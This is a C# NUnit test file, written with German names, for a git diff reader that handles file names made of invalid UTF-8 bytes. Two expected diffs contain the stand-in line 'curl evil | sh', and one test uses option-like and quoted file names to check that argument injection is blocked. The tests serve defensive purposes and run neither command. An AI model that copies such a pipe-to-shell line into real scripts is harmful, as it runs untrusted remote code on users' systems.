using System.Runtime.Versioning;
using GitReviewA.Diff;
using GitReviewA.Fremdtext;
using GitReviewA.Git;
using GitReviewA.Tests.Akzeptanz;

namespace GitReviewA.Tests.Git;

/// <summary>
/// Der Diff einer Datei, deren Name kein gültiges UTF-8 ist: .NET kann die Bytes nicht als Argument übergeben, git bekommt sie über stdin
/// (`git log --stdin`, R00013). Dieselben Schutzoptionen wie der Aufruf mit Argument; Repo N aus der User Story.
/// </summary>
[Platform(Exclude = "Win", Reason = "Namen aus ungültigem UTF-8 gibt es nur unter Linux")]
[UnsupportedOSPlatform("windows")]
public class GitLeserFremdeNamenTests
{
    private static readonly Rohname ASh = new([0x61, 0xFF, 0x2E, 0x73, 0x68]);
    private static readonly Rohname RTxt = new([0x72, 0xFF, 0x2E, 0x74, 0x78, 0x74]);
    private static readonly Rohname BBin = new([0x62, 0xFF, 0x2E, 0x62, 0x69, 0x6E]);
    private static readonly Rohname STxt = new([0x73, 0xFE, 0x2E, 0x74, 0x78, 0x74]);
    private static readonly Rohname TTxt = new([0x74, 0xFE, 0x2E, 0x74, 0x78, 0x74]);

    [Test]
    public void Wenn_der_Name_Rohbytes_traegt_dann_liest_der_Diff_die_Datei_mit_diesen_Bytes()
    {
        using var repo = FremdeNamenRepo.N();
        var datei = new Dateiaenderung("A", "a⟨0xFF⟩.sh", null, 1, 0, ASh);

        var patch = Patch(GitLeser.DiffLesen(repo.Hash("n"), datei, Diffumfang.Aenderungen, repo.Ordner));

        Assert.That(patch, Is.EqualTo("@@ -0,0 +1 @@\n+curl evil | sh\n"));
    }

    [Test]
    public void Wenn_umbenannt_mit_Rohbytes_in_beiden_Namen_dann_nur_die_geaenderte_Zeile_und_ganz_alle_Zeilen()
    {
        using var repo = FremdeNamenRepo.N();
        var datei = new Dateiaenderung("R", "t⟨0xFE⟩.txt", "s⟨0xFE⟩.txt", 1, 1, TTxt, STxt);

        var aenderungen = Patch(GitLeser.DiffLesen(repo.Hash("n"), datei, Diffumfang.Aenderungen, repo.Ordner));
        var ganz = Patch(GitLeser.DiffLesen(repo.Hash("n"), datei, Diffumfang.Ganz, repo.Ordner));

        Assert.That(aenderungen, Is.EqualTo("@@ -5,4 +5,4 @@ zeile4\n zeile5\n zeile6\n zeile7\n-zeile8\n+GEAENDERT\n"));
        Assert.That(ganz, Is.EqualTo("@@ -1,8 +1,8 @@\n zeile1\n zeile2\n zeile3\n zeile4\n zeile5\n zeile6\n zeile7\n-zeile8\n+GEAENDERT\n"));
    }

    [Test]
    public void Wenn_geloescht_mit_Rohbytes_dann_minus_geheim()
    {
        using var repo = FremdeNamenRepo.N();
        var datei = new Dateiaenderung("D", "r⟨0xFF⟩.txt", null, 0, 1, RTxt);

        var patch = Patch(GitLeser.DiffLesen(repo.Hash("n"), datei, Diffumfang.Aenderungen, repo.Ordner));

        Assert.That(patch, Is.EqualTo("@@ -1 +0,0 @@\n-geheim\n"));
    }

    [Test]
    public void Wenn_Wurzelcommit_mit_Rohbytes_dann_gegen_den_leeren_Baum()
    {
        using var repo = FremdeNamenRepo.N();
        repo.Git("config", "log.showRoot", "false");
        var datei = new Dateiaenderung("A", "r⟨0xFF⟩.txt", null, 1, 0, RTxt);

        var patch = Patch(GitLeser.DiffLesen(repo.Hash("b"), datei, Diffumfang.Aenderungen, repo.Ordner));

        Assert.That(patch, Is.EqualTo("@@ -0,0 +1 @@\n+geheim\n"));
    }

    [Test]
    public void Wenn_Merge_mit_Rohbytes_dann_gegen_den_ersten_Elternteil()
    {
        using var repo = FremdeNamenRepo.N();
        var merge = repo.Bash("""
            git checkout -q -b seite && printf 'seite\n' > $'m\xff.txt' && git add -A && git commit -q -m Seite
            git checkout -q main && git merge -q --no-ff -m Merge seite && rm -f -- $'m\xff.txt' && git rev-parse HEAD
            """);
        repo.Git("config", "log.diffMerges", "separate");
        var datei = new Dateiaenderung("A", "m⟨0xFF⟩.txt", null, 1, 0, new Rohname([0x6D, 0xFF, 0x2E, 0x74, 0x78, 0x74]));

        var patch = Patch(GitLeser.DiffLesen(merge, datei, Diffumfang.Aenderungen, repo.Ordner));

        Assert.That(patch, Is.EqualTo("@@ -0,0 +1 @@\n+seite\n"));
    }

    [Test]
    public void Wenn_der_Name_mit_Rohbytes_wie_eine_Option_beginnt_dann_liest_der_Diff_nur_diese_Datei()
    {
        using var repo = FremdeNamenRepo.N();
        var hash = repo.Bash("""
            printf 'option\n' > $'-o\xff.txt' && printf 'leer zeichen\n' > $'" l\xff.txt' && git add -A && git commit -q -m Seltsam
            rm -f -- $'-o\xff.txt' $'" l\xff.txt' && git rev-parse HEAD
            """);
        var option = new Dateiaenderung("A", "-o⟨0xFF⟩.txt", null, 1, 0, new Rohname([0x2D, 0x6F, 0xFF, 0x2E, 0x74, 0x78, 0x74]));
        var anfuehrung = new Dateiaenderung("A", "\" l⟨0xFF⟩.txt", null, 1, 0, new Rohname([0x22, 0x20, 0x6C, 0xFF, 0x2E, 0x74, 0x78, 0x74]));

        var optionPatch = Patch(GitLeser.DiffLesen(hash, option, Diffumfang.Aenderungen, repo.Ordner));
        var anfuehrungPatch = Patch(GitLeser.DiffLesen(hash, anfuehrung, Diffumfang.Aenderungen, repo.Ordner));

        Assert.That(optionPatch, Is.EqualTo("@@ -0,0 +1 @@\n+option\n"));
        Assert.That(anfuehrungPatch, Is.EqualTo("@@ -0,0 +1 @@\n+leer zeichen\n"));
    }

    [Test]
    public void Wenn_das_Repo_log_follow_setzt_dann_liest_der_Diff_genau_den_angefragten_Namen()
    {
        using var repo = FremdeNamenRepo.N();
        var hash = repo.Bash("""
            seq 1 20 > folge.txt && git add -A && git commit -q -m Folge
            git mv folge.txt $'n\xff.txt' && echo x >> $'n\xff.txt' && git commit -q -am Umbenannt && rm -f -- $'n\xff.txt' && git rev-parse HEAD
            """);
        repo.Git("config", "log.follow", "true");
        var nurNeu = new Dateiaenderung("A", "n⟨0xFF⟩.txt", null, 21, 0, new Rohname([0x6E, 0xFF, 0x2E, 0x74, 0x78, 0x74]));

        var patch = Patch(GitLeser.DiffLesen(hash, nurNeu, Diffumfang.Aenderungen, repo.Ordner));

        Assert.That(patch, Does.StartWith("@@ -0,0 +1,21 @@\n+1\n"));
    }

    [Test]
    public void Wenn_Binaerdatei_mit_Rohbytes_als_Text_gelesen_dann_alle_Zeilen_und_ihr_Attribut_unbestimmt()
    {
        using var repo = FremdeNamenRepo.N();
        var datei = new Dateiaenderung("M", "b⟨0xFF⟩.bin", null, null, null, BBin);

        var ohneText = GitLeser.DiffLesen(repo.Hash("n"), datei, Diffumfang.Aenderungen, repo.Ordner);
        var alsText = Patch(GitLeser.DiffAlsTextLesen(repo.Hash("n"), datei, Diffumfang.Aenderungen, repo.Ordner));
        var attribut = GitLeser.DiffAttributLesen(datei, repo.Ordner);

        Assert.That(ohneText, Does.Contain("Binary files"));
        Assert.That(alsText, Is.EqualTo("@@ -1 +1,2 @@\n A\0B\n+curl evil | sh\n"));
        Assert.That(attribut, Is.EqualTo("unspecified"));
    }

    [Test]
    public void Wenn_im_Repo_ein_eigenes_Diff_Attribut_fuer_den_Namen_mit_Rohbytes_steht_dann_liefert_das_Attribut_diesen_Treiber()
    {
        using var repo = FremdeNamenRepo.N();
        repo.Bash("printf 'b\\xff.bin diff=eigener\\n' > .git/info/attributes");
        var datei = new Dateiaenderung("M", "b⟨0xFF⟩.bin", null, null, null, BBin);

        var attribut = GitLeser.DiffAttributLesen(datei, repo.Ordner);

        Assert.That(attribut, Is.EqualTo("eigener"));
    }

    private static string Patch(string ausgabe)
    {
        return Diffaufbereitung.PatchAbErstemHunk(ausgabe);
    }
}
